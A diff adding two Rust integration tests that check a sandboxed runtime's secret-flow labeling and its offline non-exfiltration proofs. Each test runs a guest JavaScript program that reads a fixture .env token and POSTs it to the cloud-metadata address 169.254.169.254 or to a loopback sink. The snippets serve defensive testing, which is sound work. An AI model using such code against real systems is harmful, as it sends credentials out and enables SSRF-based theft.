@@ -851,6 +851,234 @@ fn run_surfaces_signed_http_request_write_end_body_ledger_bd_3894s() {
     assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
 }
 
+/// bd-plhag (information-flow labeling on the run path): a real guest reads a
+/// recognized secret-bearing file (`.env`) and tries to POST its contents to
+/// the cloud-metadata endpoint. The product-layer SSRF gate denies that
+/// endpoint before any socket opens, so the egress is a DENIED receipt — and
+/// because its (framed) payload contains the secret bytes read earlier, the
+/// signed ledger records it as a flow BLOCK (`flow_policy_verdict = blocked`)
+/// carrying the secret's `label_set_commitment`. The verifier SDK then proves
+/// OFFLINE, with zero trust in this runtime, that the forbidden label was
+/// blocked before reaching the sink — a real non-exfiltration guarantee.
+#[test]
+#[cfg(feature = "engine")]
+fn run_blocks_secret_egress_and_proves_non_exfiltration_bd_plhag() {
+    use frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment;
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    // A real secret-bearing file, long enough to clear the min-sample bound.
+    std::fs::write(
+        temp_dir.path().join(".env"),
+        "SECRET_TOKEN=plhag-flow-e2e-do-not-exfiltrate-abcdef0123456789\n",
+    )
+    .expect("write .env fixture secret");
+    // The guest reads the secret then POSTs it to the cloud-metadata endpoint.
+    let source = "const fs = require('fs');\n\
+         const secret = fs.readFileSync('.env', 'utf8');\n\
+         const http = require('http');\n\
+         const req = http.request('http://169.254.169.254/exfil', { method: 'POST' });\n\
+         req.end(secret);\n";
+    let app_path = create_test_app(temp_dir.path(), "app.js", source);
+
+    // legacy-risky grants fs + network_egress at the engine capability layer;
+    // the DEFAULT network policy (Block, no allowlist) denies the cloud-metadata
+    // endpoint at the product-layer SSRF gate before any socket opens.
+    let config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with a denied secret egress should still complete");
+
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native run must surface a host-effect ledger");
+    let secret_commitment = secret_file_label_set_commitment();
+
+    // The sensitive read is labeled (a source), but a read is not a sink.
+    let read = ledger
+        .entries
+        .iter()
+        .find(|e| e.receipt.effect_kind.label() == "fs_read")
+        .expect("an fs_read receipt for the .env read");
+    assert_eq!(
+        read.receipt.label_set_commitment, secret_commitment,
+        "the secret-file read must carry the secret label commitment"
+    );
+    assert_eq!(read.receipt.flow_policy_verdict.label(), "label_clean");
+
+    // The denied egress carrying the secret is a flow BLOCK.
+    let egress = ledger
+        .entries
+        .iter()
+        .find(|e| e.receipt.effect_kind.label() == "http_request")
+        .expect("an http_request receipt for the egress");
+    assert!(
+        matches!(
+            egress.receipt.policy_outcome,
+            frankenengine_node::runtime::effect_receipt::PolicyOutcome::Denied { .. }
+        ),
+        "the cloud-metadata endpoint must be SSRF-denied"
+    );
+    assert_eq!(
+        egress.receipt.flow_policy_verdict.label(),
+        "blocked",
+        "a denied egress carrying the secret is a flow block"
+    );
+    assert_eq!(egress.receipt.label_set_commitment, secret_commitment);
+    assert!(ledger.denied_count >= 1);
+
+    // OFFLINE proof: the verifier SDK re-derives the chain and proves the
+    // forbidden label was blocked before the sink.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json).expect("verifier SDK accepts the ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-plhag-blocked");
+    let chain = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the effect chain offline");
+    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
+        forbidden_label_set_commitments: vec![secret_commitment.clone()],
+        external_sink_effect_kinds: vec!["http_request".to_string()],
+        allowed_declassification_refs: vec![],
+    };
+    let non_exfil =
+        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
+            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
+    let http_proof = non_exfil
+        .examined_effects
+        .iter()
+        .find(|e| e.effect_kind == "http_request")
+        .expect("an examined http_request effect");
+    assert_eq!(
+        http_proof.proof_outcome, "blocked_before_sink",
+        "the SDK must classify the blocked secret egress as blocked_before_sink"
+    );
+}
+
+/// bd-plhag (detection at an allowed sink): the same secret read, but the
+/// guest POSTs it to an operator-allowlisted loopback endpoint that the SSRF
+/// gate PERMITS. The runtime does not block it (byte-level prevention at an
+/// allowed sink is a gate-level follow-up), so the ledger honestly records an
+/// ALLOWED egress that carries the secret label with a label-clean verdict.
+/// The verifier SDK then DETECTS the exfiltration — the non-exfiltration claim
+/// fails closed — proving the ledger is faithful evidence even when the
+/// endpoint gate did not catch the leak.
+#[test]
+#[cfg(feature = "engine")]
+fn run_detects_secret_egress_to_allowed_sink_bd_plhag() {
+    use frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment;
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+
+    // A loopback sink that accepts the POST and reads it to EOF, then replies.
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
+    let addr = listener.local_addr().expect("listener addr");
+    let server = std::thread::spawn(move || {
+        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
+        stream
+            .set_read_timeout(Some(Duration::from_secs(5)))
+            .expect("read timeout");
+        let mut received = Vec::new();
+        let _ = stream.read_to_end(&mut received);
+        let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok");
+        let _ = stream.flush();
+        received
+    });
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    std::fs::write(
+        temp_dir.path().join(".env"),
+        "SECRET_TOKEN=plhag-flow-e2e-do-not-exfiltrate-abcdef0123456789\n",
+    )
+    .expect("write .env fixture secret");
+    let source = format!(
+        "const fs = require('fs');\n\
+         const secret = fs.readFileSync('.env', 'utf8');\n\
+         const http = require('http');\n\
+         const req = http.request('http://{addr}/collect', {{ method: 'POST' }});\n\
+         req.end(secret);\n"
+    );
+    let app_path = create_test_app(temp_dir.path(), "app.js", &source);
+
+    let mut config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    config
+        .security
+        .network_policy
+        .allowlist
+        .push(NetworkAllowlistEntry {
+            host: "127.0.0.1".to_string(),
+            port: None,
+            reason: "bd-plhag e2e: permit the loopback sink so SSRF allows it".to_string(),
+        });
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with an allowlisted secret egress should complete");
+
+    // The secret bytes really reached the sink (the leak physically happened).
+    let received = server.join().expect("server thread");
+    let wire = String::from_utf8_lossy(&received);
+    assert!(
+        wire.contains("plhag-flow-e2e-do-not-exfiltrate"),
+        "the loopback sink must observe the exfiltrated secret in the POST body, got {wire:?}"
+    );
+
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("host-effect ledger");
+    let secret_commitment = secret_file_label_set_commitment();
+    let egress = ledger
+        .entries
+        .iter()
+        .find(|e| e.receipt.effect_kind.label() == "http_request")
+        .expect("an http_request receipt for the egress");
+    assert!(
+        matches!(
+            egress.receipt.policy_outcome,
+            frankenengine_node::runtime::effect_receipt::PolicyOutcome::Allowed { .. }
+        ),
+        "the allowlisted loopback endpoint must be SSRF-allowed"
+    );
+    // Honest: the runtime did NOT block it; the ledger records a label-clean
+    // allowed egress that nonetheless carries the secret commitment.
+    assert_eq!(egress.receipt.flow_policy_verdict.label(), "label_clean");
+    assert_eq!(egress.receipt.label_set_commitment, secret_commitment);
+
+    // The verifier SDK DETECTS the exfiltration: a forbidden label reached the
+    // disclosed sink without a block or declassification → claim fails closed.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json).expect("verifier SDK accepts the ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-plhag-detect");
+    let chain = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the effect chain offline");
+    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
+        forbidden_label_set_commitments: vec![secret_commitment],
+        external_sink_effect_kinds: vec!["http_request".to_string()],
+        allowed_declassification_refs: vec![],
+    };
+    let verdict =
+        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim);
+    assert!(
+        verdict.is_err(),
+        "the SDK must fail the non-exfiltration claim: the secret reached an allowed sink unblocked, got {verdict:?}"
+    );
+}
+
 /// bd-3894s slice (2c) (http leg, mock-free e2e — response callback delivery): a
 /// real, idiomatic JS program that uses the Node response-callback form —
 /// `http.get(url, (res) => { ... })` — run through the PUBLIC `dispatch_run` path.
